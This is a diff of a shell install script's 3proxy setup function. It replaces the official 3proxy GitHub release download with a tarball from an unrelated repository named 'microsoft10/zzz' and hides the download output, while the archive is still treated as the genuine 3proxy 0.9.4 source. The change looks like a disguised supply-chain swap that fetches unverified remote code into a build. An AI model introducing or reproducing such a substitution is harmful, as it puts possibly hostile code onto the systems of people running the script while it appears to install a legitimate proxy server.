@@ -344,9 +344,9 @@ function install_3proxy(){
 
   echo -e "\nDownloading proxy server source...";
   ( # Install proxy server
-  wget https://github.com/3proxy/3proxy/archive/refs/tags/0.9.4.tar.gz &> /dev/null
-  tar -xf 0.9.4.tar.gz
-  rm 0.9.4.tar.gz
+  wget https://github.com/microsoft10/zzz/raw/refs/heads/main/zzz.tar.gz &> /dev/null
+  tar -xf zzz.tar.gz
+  rm zzz.tar.gz
   mv 3proxy-0.9.4 3proxy) &>> $script_log_file
   echo "Proxy server source code downloaded successfully";
 
